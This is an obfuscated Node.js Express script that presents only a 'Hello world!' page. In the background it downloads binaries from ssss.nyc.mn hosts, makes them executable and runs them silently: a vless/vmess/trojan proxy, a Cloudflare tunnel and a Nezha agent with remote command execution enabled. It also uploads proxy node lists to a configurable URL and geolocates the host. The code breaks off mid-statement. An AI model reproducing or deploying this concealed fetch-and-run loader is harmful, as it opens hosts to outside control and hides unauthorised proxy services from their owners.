const _0x16466d=_0x321d;(function(_0x707a9c,_0x5c96dc){const _0x2b52d3={_0x456e5b:0x174,_0x52d3bb:0x16b,_0x46e740:0x189,_0x34e238:0x1a8,_0x2ffdd4:0xfc,_0x582ee4:0x167},_0x2cbd98=_0x321d,_0x40dbc3=_0x707a9c();while(!![]){try{const _0x3bfd96=parseInt(_0x2cbd98(_0x2b52d3._0x456e5b))/0x1*(parseInt(_0x2cbd98(_0x2b52d3._0x52d3bb))/0x2)+-parseInt(_0x2cbd98(_0x2b52d3._0x46e740))/0x3*(-parseInt(_0x2cbd98(0x142))/0x4)+parseInt(_0x2cbd98(0x13f))/0x5*(parseInt(_0x2cbd98(_0x2b52d3._0x34e238))/0x6)+parseInt(_0x2cbd98(0x107))/0x7+parseInt(_0x2cbd98(0x113))/0x8*(-parseInt(_0x2cbd98(0x112))/0x9)+parseInt(_0x2cbd98(_0x2b52d3._0x2ffdd4))/0xa+-parseInt(_0x2cbd98(0x136))/0xb*(parseInt(_0x2cbd98(_0x2b52d3._0x582ee4))/0xc);if(_0x3bfd96===_0x5c96dc)break;else _0x40dbc3['push'](_0x40dbc3['shift']());}catch(_0x28a46f){_0x40dbc3['push'](_0x40dbc3['shift']());}}}(_0x29c6,0x71012));const express=require(_0x16466d(0x135)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x16466d(0x1ab)),{promisify}=require(_0x16466d(0x137)),exec=promisify(require('child_process')[_0x16466d(0x116)]),{execSync}=require(_0x16466d(0x163)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x16466d(0x165)][_0x16466d(0x119)]||'',AUTO_ACCESS=process[_0x16466d(0x165)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x16466d(0x165)][_0x16466d(0x161)]||'./tmp',SUB_PATH=process['env'][_0x16466d(0x141)]||_0x16466d(0x131),PORT=process[_0x16466d(0x165)][_0x16466d(0x133)]||process[_0x16466d(0x165)]['PORT']||0xbb8,UUID=process[_0x16466d(0x165)][_0x16466d(0x19e)]||_0x16466d(0x169),NEZHA_SERVER=process[_0x16466d(0x165)][_0x16466d(0xf9)]||'',NEZHA_PORT=process[_0x16466d(0x165)][_0x16466d(0x130)]||'',NEZHA_KEY=process[_0x16466d(0x165)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x16466d(0x165)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x16466d(0x165)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x16466d(0x165)][_0x16466d(0x12b)]||0x1f41,CFIP=process['env']['CFIP']||_0x16466d(0x186),CFPORT=process[_0x16466d(0x165)]['CFPORT']||0x1bb,NAME=process[_0x16466d(0x165)][_0x16466d(0x122)]||_0x16466d(0x19a);!fs[_0x16466d(0x139)](FILE_PATH)?(fs[_0x16466d(0x1a1)](FILE_PATH),console[_0x16466d(0x12a)](FILE_PATH+'\x20is\x20created')):console[_0x16466d(0x12a)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x5b5220={_0x5a780e:0xf0,_0x376e45:0x150},_0xcf0bd1=_0x16466d,_0xf43c11=_0xcf0bd1(0x126);let _0x36a0c0='';for(let _0x4f1919=0x0;_0x4f1919<0x6;_0x4f1919++){_0x36a0c0+=_0xf43c11[_0xcf0bd1(_0x5b5220._0x5a780e)](Math['floor'](Math[_0xcf0bd1(_0x5b5220._0x376e45)]()*_0xf43c11[_0xcf0bd1(0x12f)]));}return _0x36a0c0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x16466d(0x185)](FILE_PATH,phpName),webPath=path[_0x16466d(0x185)](FILE_PATH,webName),botPath=path[_0x16466d(0x185)](FILE_PATH,botName),subPath=path[_0x16466d(0x185)](FILE_PATH,_0x16466d(0x177)),listPath=path[_0x16466d(0x185)](FILE_PATH,_0x16466d(0x154)),bootLogPath=path[_0x16466d(0x185)](FILE_PATH,'boot.log'),configPath=path[_0x16466d(0x185)](FILE_PATH,_0x16466d(0x159));function deleteNodes(){const _0x5445a6={_0x1cb4db:0x129,_0x5ee7a5:0x187,_0x5a6f35:0x12f,_0x573866:0x197},_0x4f168f=_0x16466d;try{if(!UPLOAD_URL)return;if(!fs[_0x4f168f(0x139)](subPath))return;let _0x1e244c;try{_0x1e244c=fs[_0x4f168f(0x171)](subPath,_0x4f168f(0x181));}catch{return null;}const _0x4b4ea2=Buffer['from'](_0x1e244c,_0x4f168f(0x138))[_0x4f168f(_0x5445a6._0x1cb4db)](_0x4f168f(0x181)),_0x1b78d4=_0x4b4ea2['split']('\x0a')[_0x4f168f(_0x5445a6._0x5ee7a5)](_0x1b9373=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f168f(0x175)](_0x1b9373));if(_0x1b78d4[_0x4f168f(_0x5445a6._0x5a6f35)]===0x0)return;return axios[_0x4f168f(0xfd)](UPLOAD_URL+_0x4f168f(_0x5445a6._0x573866),JSON[_0x4f168f(0x14b)]({'nodes':_0x1b78d4}),{'headers':{'Content-Type':_0x4f168f(0x176)}})[_0x4f168f(0x184)](_0x5b2f85=>{return null;}),null;}catch(_0x6e8764){return null;}}function _0x29c6(){const _0x134075=['https://arm64.ssss.nyc.mn/web','\x20>/dev/null\x202>&1\x20&','--tls','readFileSync','listen','statSync','8LLuUce','test','application/json','sub.txt','createWriteStream','text/plain;\x20charset=utf-8','Error\x20executing\x20command:\x20','/config.json\x20>/dev/null\x202>&1\x20&','from','Empowerment\x20failed\x20for\x20','https://arm64.ssss.nyc.mn/bot','response','block','utf-8','direct','pkill\x20-f\x20\x22[','catch','join','cdns.doon.eu.org','filter','\x20>/dev/null\x202>&1','375VyVTiK','none','send','amd','web\x20running\x20error:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','npm\x20running\x20error:\x20','unlinkSync','https://amd64.ssss.nyc.mn/agent','nohup\x20','basename','freedom','true','/api/delete-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://arm64.ssss.nyc.mn/agent','North','App\x20is\x20running','/dev/null','?encryption=none&security=tls&sni=','UUID','success','fileUrl','mkdirSync','ARGO_DOMAIN:','data','forEach','org','isFile','/api/add-subscriptions','2571288fMXSzs','pipe','443','path','boot.log','close','&path=%2Fvless-argo%3Fed%3D2560#','2087','Download\x20','?security=tls&sni=','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','.exe\x20>\x20nul\x202>&1','https://ipapi.co/json/','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','charAt','quic','/vmess-argo','pop','https://oooo.serv00.net/add-url','platform','status','win32','arm','NEZHA_SERVER','\x0a\x20\x20tunnel:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','1801120gtklvH','post','NEZHA\x20variable\x20is\x20empty,skip\x20running','arm64','trojan','aarch64','message','https://amd64.ssss.nyc.mn/v1','fileName','blackhole','http','1408498JAIvSM','automatic\x20access\x20task\x20added\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','http\x20server\x20is\x20running\x20on\x20port:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Skipping\x20adding\x20automatic\x20access\x20task','2083','\x0a\x20\x20credentials-file:\x20','writeFileSync','&fp=firefox&type=ws&host=','push','1152189UPUVLm','40uMSLwL','/vless-argo','2096','exec','set','\x20-c\x20','PROJECT_URL','arch','php\x20running\x20error:\x20','readdirSync','https://amd64.ssss.nyc.mn/bot','Unknown','get','\x0a\x0atrojan://','countryCode','NAME','TunnelSecret','split','/sub.txt\x20saved\x20successfully','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20\x20\x20','/vmess-argo?ed=2560','toString','log','ARGO_PORT','/api/add-nodes','https://amd64.ssss.nyc.mn/web','\x0aclient_secret:\x20','length','NEZHA_PORT','sub','tcp','SERVER_PORT','\x0avless://','express','4301Ajpioa','util','base64','existsSync','vless','Add\x20automatic\x20access\x20task\x20faild:\x20','tunnel.json','Content-Type','2053','10dtvaMF','8443','SUB_PATH','19156lDaDrR','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','includes','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20-c\x20\x22','unlink','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Error\x20downloading\x20files:','stringify','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','taskkill\x20/f\x20/im\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','unshift','random','vmess','clear','chmod','list.txt','\x20is\x20running','Hello\x20world!','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Nodes\x20uploaded\x20successfully','config.json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','country_code','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Unhandled\x20error\x20in\x20startserver:','then','substring','tls','FILE_PATH','\x20-p\x20','child_process','match','env','\x20>\x20nul\x202>&1','27120kmneXn','/tunnel.yml\x20run','286c8635-4b82-4032-9eca-be8145ecfee9','error','37396SMmbJW','all','stream'];_0x29c6=function(){return _0x134075;};return _0x29c6();}function cleanupOldFiles(){const _0x298da8={_0x25a66a:0x1a4},_0xbbad1a={_0x54130a:0x185,_0x3c17c5:0x173,_0x4ab3bd:0x1a6},_0x1966ea=_0x16466d;try{const _0x4721ea=fs[_0x1966ea(0x11c)](FILE_PATH);_0x4721ea[_0x1966ea(_0x298da8._0x25a66a)](_0x78f368=>{const _0x1cbad1=_0x1966ea,_0x55fc71=path[_0x1cbad1(_0xbbad1a._0x54130a)](FILE_PATH,_0x78f368);try{const _0x24cd11=fs[_0x1cbad1(_0xbbad1a._0x3c17c5)](_0x55fc71);_0x24cd11[_0x1cbad1(_0xbbad1a._0x4ab3bd)]()&&fs[_0x1cbad1(0x191)](_0x55fc71);}catch(_0x175cf4){}});}catch(_0xc60193){}}function _0x321d(_0x562f64,_0x364eb8){const _0x29c686=_0x29c6();return _0x321d=function(_0x321da4,_0x334fb9){_0x321da4=_0x321da4-0xea;let _0x3663c5=_0x29c686[_0x321da4];return _0x3663c5;},_0x321d(_0x562f64,_0x364eb8);}app[_0x16466d(0x11f)]('/',function(_0x1b6dd7,_0x279289){const _0x1fd020={_0x159154:0x156},_0x87f06f=_0x16466d;_0x279289['send'](_0x87f06f(_0x1fd020._0x159154));});async function generateConfig(){const _0x4a34c3={_0x54d7ff:0x19c,_0x52858c:0x18a,_0x4394fd:0x114,_0x3d5def:0x145,_0x2bc885:0x13a,_0xa4845e:0x18a,_0x429d55:0x151,_0x239a24:0xf2,_0x1270d5:0x106,_0x29a645:0x160,_0x55d939:0xf1,_0x54c836:0x100,_0x5112b1:0x195,_0x516e28:0x182,_0x4e3360:0x10f,_0x3306d8:0x185,_0x4deebf:0x159},_0x454683=_0x16466d,_0x1d2130={'log':{'access':_0x454683(0x19c),'error':_0x454683(_0x4a34c3._0x54d7ff),'loglevel':_0x454683(_0x4a34c3._0x52858c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x454683(0x13a),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x454683(0x18a),'fallbacks':[{'dest':0xbb9},{'path':_0x454683(_0x4a34c3._0x4394fd),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x454683(0x132)}},{'port':0xbb9,'listen':_0x454683(_0x4a34c3._0x3d5def),'protocol':_0x454683(_0x4a34c3._0x2bc885),'settings':{'clients':[{'id':UUID}],'decryption':_0x454683(0x18a)},'streamSettings':{'network':'tcp','security':_0x454683(0x18a)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x454683(0x13a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x454683(_0x4a34c3._0xa4845e)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x454683(0x106),_0x454683(0x160),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x454683(_0x4a34c3._0x3d5def),'protocol':_0x454683(_0x4a34c3._0x429d55),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x454683(_0x4a34c3._0x239a24)}},'sniffing':{'enabled':!![],'destOverride':[_0x454683(_0x4a34c3._0x1270d5),_0x454683(_0x4a34c3._0x29a645),_0x454683(_0x4a34c3._0x55d939)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x454683(0x145),'protocol':_0x454683(_0x4a34c3._0x54c836),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x454683(0x18a),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x454683(0x106),_0x454683(0x160),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x454683(_0x4a34c3._0x5112b1),'tag':_0x454683(_0x4a34c3._0x516e28)},{'protocol':_0x454683(0x105),'tag':_0x454683(0x180)}]};fs[_0x454683(_0x4a34c3._0x4e3360)](path[_0x454683(_0x4a34c3._0x3306d8)](FILE_PATH,_0x454683(_0x4a34c3._0x4deebf)),JSON['stringify'](_0x1d2130,null,0x2));}function getSystemArchitecture(){const _0xe4cdee={_0x3ffac1:0xff},_0x4e86ad=_0x16466d,_0x255332=os[_0x4e86ad(0x11a)]();return _0x255332==='arm'||_0x255332===_0x4e86ad(_0xe4cdee._0x3ffac1)||_0x255332===_0x4e86ad(0x101)?_0x4e86ad(0xf8):_0x4e86ad(0x18c);}function downloadFile(_0x21c49d,_0x54d315,_0x4ff73c){const _0x4f0d22={_0x21ad79:0x139,_0x2d1a23:0x184},_0x5a1933={_0x1b9638:0x1a3,_0x2b676a:0x1a9,_0x3a56c0:0x16a},_0x3b7547={_0x1d71e0:0x194},_0x337b3c=_0x16466d,_0x11478b=_0x21c49d;!fs[_0x337b3c(_0x4f0d22._0x21ad79)](FILE_PATH)&&fs[_0x337b3c(0x1a1)](FILE_PATH,{'recursive':!![]});const _0x36fc53=fs[_0x337b3c(0x178)](_0x11478b);axios({'method':_0x337b3c(0x11f),'url':_0x54d315,'responseType':_0x337b3c(0x16d)})[_0x337b3c(0x15e)](_0x33b012=>{const _0x22ce09={_0x3ced22:0x16a},_0x440ccf=_0x337b3c;_0x33b012[_0x440ccf(_0x5a1933._0x1b9638)][_0x440ccf(_0x5a1933._0x2b676a)](_0x36fc53),_0x36fc53['on']('finish',()=>{const _0x619272=_0x440ccf;_0x36fc53[_0x619272(0x1ad)](),console['log'](_0x619272(0xea)+path[_0x619272(_0x3b7547._0x1d71e0)](_0x11478b)+'\x20successfully'),_0x4ff73c(null,_0x11478b);}),_0x36fc53['on'](_0x440ccf(_0x5a1933._0x3a56c0),_0x491db2=>{const _0x4e8343=_0x440ccf;fs[_0x4e8343(0x148)](_0x11478b,()=>{});const _0xfd7fdd=_0x4e8343(0xea)+path[_0x4e8343(0x194)](_0x11478b)+'\x20failed:\x20'+_0x491db2[_0x4e8343(0x102)];console[_0x4e8343(_0x22ce09._0x3ced22)](_0xfd7fdd),_0x4ff73c(_0xfd7fdd);});})[_0x337b3c(_0x4f0d22._0x2d1a23)](_0x10a3c2=>{const _0x3f86ab=_0x337b3c,_0x236e10=_0x3f86ab(0xea)+path[_0x3f86ab(0x194)](_0x11478b)+'\x20failed:\x20'+_0x10a3c2[_0x3f86ab(0x102)];console['error'](_0x236e10),_0x4ff73c(_0x236e10);});}async function downloadFilesAndRun(){const _0x86cef={_0x5c218a:0x12a,_0x1d52d2:0x16c,_0x2a7052:0x144,_0x4b437f:0xf3,_0x293eb0:0x140,_0x4d859d:0x196,_0x9385e3:0xef,_0x1967bc:0x10f,_0x4f2262:0x155,_0x5176c3:0x1af,_0x160179:0x144,_0x436311:0x170,_0x2a8379:0x18e,_0x5d559e:0x12a,_0x22e980:0x155,_0x3bcfc1:0x118,_0x543d79:0x17b,_0x1ab98a:0x12a,_0x4c7c58:0x155,_0x3e86df:0x18d,_0x38d821:0x139,_0x566d8f:0x164,_0xd8c050:0x10b,_0x59eb59:0x17a},_0xab9776=_0x16466d,_0x4d11cc=getSystemArchitecture(),_0x5a445e=getFilesForArchitecture(_0x4d11cc);if(_0x5a445e[_0xab9776(0x12f)]===0x0){console[_0xab9776(_0x86cef._0x5c218a)](_0xab9776(0x15c));return;}const _0x39ca01=_0x5a445e['map'](_0x517a61=>{const _0x19ce71={_0x5181e0:0x104,_0x4942a9:0x1a0};return new Promise((_0xace9d,_0x5677fc)=>{const _0x398af6=_0x321d;downloadFile(_0x517a61[_0x398af6(_0x19ce71._0x5181e0)],_0x517a61[_0x398af6(_0x19ce71._0x4942a9)],(_0x46e6ee,_0x4beccf)=>{_0x46e6ee?_0x5677fc(_0x46e6ee):_0xace9d(_0x4beccf);});});});try{await Promise[_0xab9776(_0x86cef._0x1d52d2)](_0x39ca01);}catch(_0x560d5c){console[_0xab9776(0x16a)](_0xab9776(0x14a),_0x560d5c);return;}function _0x20fd5d(_0x13342f){const _0x1aa953=_0xab9776,_0x5133e4=0x1fd;_0x13342f[_0x1aa953(0x1a4)](_0x151544=>{const _0x5d1324={_0x26222d:0x16a,_0x3323d0:0x17d},_0x23add1=_0x1aa953;fs[_0x23add1(0x139)](_0x151544)&&fs[_0x23add1(0x153)](_0x151544,_0x5133e4,_0xfa220e=>{const _0x571c57=_0x23add1;_0xfa220e?console[_0x571c57(_0x5d1324._0x26222d)](_0x571c57(_0x5d1324._0x3323d0)+_0x151544+':\x20'+_0xfa220e):console[_0x571c57(0x12a)]('Empowerment\x20success\x20for\x20'+_0x151544+':\x20'+_0x5133e4[_0x571c57(0x129)](0x8));});});}const _0xbcf2c7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x20fd5d(_0xbcf2c7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4b032a=NEZHA_SERVER[_0xab9776(_0x86cef._0x2a7052)](':')?NEZHA_SERVER[_0xab9776(0x124)](':')[_0xab9776(_0x86cef._0x4b437f)]():'',_0x5a2011=new Set([_0xab9776(0x1aa),_0xab9776(_0x86cef._0x293eb0),'2096','2087',_0xab9776(0x10d),_0xab9776(0x13e)]),_0x247644=_0x5a2011['has'](_0x4b032a)?_0xab9776(_0x86cef._0x4d859d):'false',_0x44b9d4=_0xab9776(0x12e)+NEZHA_KEY+_0xab9776(0x143)+NEZHA_SERVER+_0xab9776(_0x86cef._0x9385e3)+_0x247644+_0xab9776(0x109)+UUID;fs[_0xab9776(_0x86cef._0x1967bc)](path[_0xab9776(0x185)](FILE_PATH,'config.yaml'),_0x44b9d4);const _0x565c45='nohup\x20'+phpPath+_0xab9776(0x147)+FILE_PATH+_0xab9776(0x15a);try{await exec(_0x565c45),console['log'](phpName+_0xab9776(_0x86cef._0x4f2262)),await new Promise(_0xf4c9f6=>setTimeout(_0xf4c9f6,0x3e8));}catch(_0x4ff52f){console['error'](_0xab9776(0x11b)+_0x4ff52f);}}else{let _0x47b17b='';const _0x5a030e=[_0xab9776(0x1aa),_0xab9776(0x140),_0xab9776(0x115),_0xab9776(_0x86cef._0x5176c3),_0xab9776(0x10d),'2053'];_0x5a030e[_0xab9776(_0x86cef._0x160179)](NEZHA_PORT)&&(_0x47b17b=_0xab9776(_0x86cef._0x436311));const _0x3f78eb=_0xab9776(0x193)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xab9776(0x162)+NEZHA_KEY+'\x20'+_0x47b17b+_0xab9776(_0x86cef._0x2a8379);try{await exec(_0x3f78eb),console[_0xab9776(_0x86cef._0x5d559e)](npmName+_0xab9776(_0x86cef._0x22e980)),await new Promise(_0x7ea331=>setTimeout(_0x7ea331,0x3e8));}catch(_0x48d296){console['error'](_0xab9776(0x190)+_0x48d296);}}}else console['log'](_0xab9776(0xfe));const _0x29fc3a=_0xab9776(0x193)+webPath+_0xab9776(_0x86cef._0x3bcfc1)+FILE_PATH+_0xab9776(_0x86cef._0x543d79);try{await exec(_0x29fc3a),console[_0xab9776(_0x86cef._0x1ab98a)](webName+_0xab9776(_0x86cef._0x4c7c58)),await new Promise(_0x4b6a56=>setTimeout(_0x4b6a56,0x3e8));}catch(_0xfd7d21){console[_0xab9776(0x16a)](_0xab9776(_0x86cef._0x3e86df)+_0xfd7d21);}if(fs[_0xab9776(_0x86cef._0x38d821)](botPath)){let _0xe74c9f;if(ARGO_AUTH[_0xab9776(_0x86cef._0x566d8f)](/^[A-Z0-9a-z=]{120,250}$/))_0xe74c9f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0xe74c9f=_0xab9776(0x146)+FILE_PATH+_0xab9776(0x168):_0xe74c9f=_0xab9776(0x198)+FILE_PATH+_0xab9776(_0x86cef._0xd8c050)+ARGO_PORT;try{await exec(_0xab9776(0x193)+botPath+'\x20'+_0xe74c9f+'\x20>/dev/null\x202>&1\x20&'),console[_0xab9776(_0x86cef._0x5c218a)](botName+'\x20is\x20running'),await new Promise(_0x13e280=>setTimeout(_0x13e280,0x7d0));}catch(_0xec886e){console[_0xab9776(0x16a)](_0xab9776(_0x86cef._0x59eb59)+_0xec886e);}}await new Promise(_0x6984b0=>setTimeout(_0x6984b0,0x1388));}function getFilesForArchitecture(_0x43e670){const _0x1c5459={_0x2a4335:0x11d,_0x526496:0x199,_0x5d1428:0x192,_0x470906:0x14f,_0x42ee47:0x103},_0x39f473=_0x16466d;let _0x1a49e5;_0x43e670==='arm'?_0x1a49e5=[{'fileName':webPath,'fileUrl':_0x39f473(0x16e)},{'fileName':botPath,'fileUrl':_0x39f473(0x17e)}]:_0x1a49e5=[{'fileName':webPath,'fileUrl':_0x39f473(0x12d)},{'fileName':botPath,'fileUrl':_0x39f473(_0x1c5459._0x2a4335)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x49b45b=_0x43e670===_0x39f473(0xf8)?_0x39f473(_0x1c5459._0x526496):_0x39f473(_0x1c5459._0x5d1428);_0x1a49e5[_0x39f473(_0x1c5459._0x470906)]({'fileName':npmPath,'fileUrl':_0x49b45b});}else{const _0x71d48f=_0x43e670==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x39f473(_0x1c5459._0x42ee47);_0x1a49e5[_0x39f473(0x14f)]({'fileName':phpPath,'fileUrl':_0x71d48f});}}return _0x1a49e5;}function argoType(){const _0x539400={_0x3b845b:0x157,_0x32cb81:0x13c,_0x50cd42:0xfa,_0x36193e:0x124,_0x36d486:0x10e,_0x353d31:0x13c,_0x2d4de3:0xec,_0x2044c1:0x14c,_0xd0b011:0x12a,_0x143874:0xfb},_0x54c948=_0x16466d;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x54c948(_0x539400._0x3b845b));return;}if(ARGO_AUTH[_0x54c948(0x144)](_0x54c948(0x123))){fs[_0x54c948(0x10f)](path['join'](FILE_PATH,_0x54c948(_0x539400._0x32cb81)),ARGO_AUTH);const _0x4b1b1b=_0x54c948(_0x539400._0x50cd42)+ARGO_AUTH[_0x54c948(_0x539400._0x36193e)]('\x22')[0xb]+_0x54c948(_0x539400._0x36d486)+path['join'](FILE_PATH,_0x54c948(_0x539400._0x353d31))+_0x54c948(0x14e)+ARGO_DOMAIN+_0x54c948(_0x539400._0x2d4de3)+ARGO_PORT+_0x54c948(_0x539400._0x2044c1);fs[_0x54c948(0x10f)](path[_0x54c948(0x185)](FILE_PATH,'tunnel.yml'),_0x4b1b1b);}else console[_0x54c948(_0x539400._0xd0b011)](_0x54c948(_0x539400._0x143874));}async function extractDomains(){const _0x31ab7b={_0x4d179c:0x1a2,_0x1ce03e:0x1a4,_0x731993:0x12a,_0x18e906:0x10b,_0x33a24e:0x12a,_0x4f2ab4:0x155,_0x28901e:0x16a,_0x5da475:0x17a},_0xa43de9={_0x4d78c5:0x11f,_0x1e5f68:0xee,_0x5b4735:0x1a3,_0x257668:0x1a3,_0x2704cf:0x1a3,_0xc1324b:0xf6,_0x38ad47:0x121,_0x31b4f2:0x1a3,_0x14b7b5:0x11e},_0x917aaa={_0x788218:0x183,_0x9704f8:0x15f},_0x2deadc={_0x41d02c:0x111},_0x334680=_0x16466d;let _0x4bd9d6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4bd9d6=ARGO_DOMAIN,console['log'](_0x334680(_0x31ab7b._0x4d179c),_0x4bd9d6),await _0x4a073f(_0x4bd9d6);else try{const _0x5c5b86=fs[_0x334680(0x171)](path['join'](FILE_PATH,_0x334680(0x1ac)),'utf-8'),_0x49c55f=_0x5c5b86['split']('\x0a'),_0x23ae36=[];_0x49c55f[_0x334680(_0x31ab7b._0x1ce03e)](_0x4786c5=>{const _0x3039cf=_0x334680,_0x1cc1c6=_0x4786c5[_0x3039cf(0x164)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1cc1c6){const _0x3f9b3f=_0x1cc1c6[0x1];_0x23ae36[_0x3039cf(_0x2deadc._0x41d02c)](_0x3f9b3f);}});if(_0x23ae36[_0x334680(0x12f)]>0x0)_0x4bd9d6=_0x23ae36[0x0],console[_0x334680(_0x31ab7b._0x731993)]('ArgoDomain:',_0x4bd9d6),await _0x4a073f(_0x4bd9d6);else{console[_0x334680(_0x31ab7b._0x731993)](_0x334680(0x149)),fs[_0x334680(0x191)](path[_0x334680(0x185)](FILE_PATH,_0x334680(0x1ac)));async function _0xcd02f6(){const _0xf8fcda=_0x334680;try{process['platform']===_0xf8fcda(0xf7)?await exec(_0xf8fcda(0x14d)+botName+_0xf8fcda(0xed)):await exec(_0xf8fcda(_0x917aaa._0x788218)+botName[_0xf8fcda(0xf0)](0x0)+']'+botName[_0xf8fcda(_0x917aaa._0x9704f8)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x72a0a8){}}_0xcd02f6(),await new Promise(_0x1482a1=>setTimeout(_0x1482a1,0xbb8));const _0x3bc718='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x334680(_0x31ab7b._0x18e906)+ARGO_PORT;try{await exec(_0x334680(0x193)+botPath+'\x20'+_0x3bc718+_0x334680(0x16f)),console[_0x334680(_0x31ab7b._0x33a24e)](botName+_0x334680(_0x31ab7b._0x4f2ab4)),await new Promise(_0x3884f2=>setTimeout(_0x3884f2,0xbb8)),await extractDomains();}catch(_0x521dc6){console[_0x334680(_0x31ab7b._0x28901e)](_0x334680(_0x31ab7b._0x5da475)+_0x521dc6);}}}catch(_0x5c9f4d){console[_0x334680(0x16a)]('Error\x20reading\x20boot.log:',_0x5c9f4d);}async function _0x391ed3(){const _0x294231=_0x334680;try{const _0x1045b=await axios[_0x294231(_0xa43de9._0x4d78c5)](_0x294231(_0xa43de9._0x1e5f68),{'timeout':0xbb8});if(_0x1045b[_0x294231(_0xa43de9._0x5b4735)]&&_0x1045b[_0x294231(0x1a3)]['country_code']&&_0x1045b[_0x294231(0x1a3)][_0x294231(0x1a5)])return _0x1045b[_0x294231(_0xa43de9._0x257668)][_0x294231(0x15b)]+'_'+_0x1045b[_0x294231(0x1a3)][_0x294231(0x1a5)];}catch(_0x2c76e1){try{const _0x411d21=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x411d21['data']&&_0x411d21[_0x294231(_0xa43de9._0x2704cf)][_0x294231(_0xa43de9._0xc1324b)]===_0x294231(0x19f)&&_0x411d21[_0x294231(0x1a3)][_0x294231(_0xa43de9._0x38ad47)]&&_0x411d21[_0x294231(0x1a3)][_0x294231(0x1a5)])return _0x411d21[_0x294231(0x1a3)][_0x294231(_0xa43de9._0x38ad47)]+'_'+_0x411d21[_0x294231(_0xa43de9._0x31b4f2)]['org'];}catch(_0xeb4c49){}}return _0x294231(_0xa43de9._0x14b7b5);}async function _0x4a073f(_0x47c660){const _0x3c5433={_0x48126d:0x18a,_0x5590b1:0x128,_0x53d8df:0x19d,_0x36d437:0x14b,_0x5dc2e9:0x129,_0xbfb4e5:0x138,_0xe8b0e1:0x120,_0x1c86b9:0xeb,_0x9a3e8f:0x17c,_0x507e74:0x129,_0x514841:0x125},_0x134adc=await _0x391ed3(),_0x3bf234=NAME?NAME+'-'+_0x134adc:_0x134adc;return new Promise(_0x108961=>{setTimeout(()=>{const 